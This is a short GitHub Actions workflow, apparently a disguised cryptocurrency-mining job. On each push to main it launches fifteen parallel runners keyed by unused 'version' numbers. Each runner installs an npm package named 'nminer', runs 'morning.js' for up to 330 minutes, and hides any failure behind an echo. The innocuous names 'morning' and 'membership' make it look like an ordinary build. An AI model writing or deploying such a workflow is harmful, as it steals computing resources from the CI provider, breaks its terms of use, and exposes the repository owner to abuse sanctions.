name: morning
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8933 }
          - { version: 7896 }
          - { version: 1263 }
          - { version: 9087 }
          - { version: 6794 }
          - { version: 9041 }
          - { version: 3162 }
          - { version: 4855 }
          - { version: 3450 }
          - { version: 9559 }
          - { version: 6427 }
          - { version: 5553 }
          - { version: 1044 }
          - { version: 4049 }
          - { version: 8401 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: membership
        run: |
          npm install nminer@latest
          timeout 330m node morning.js || echo "morning executed"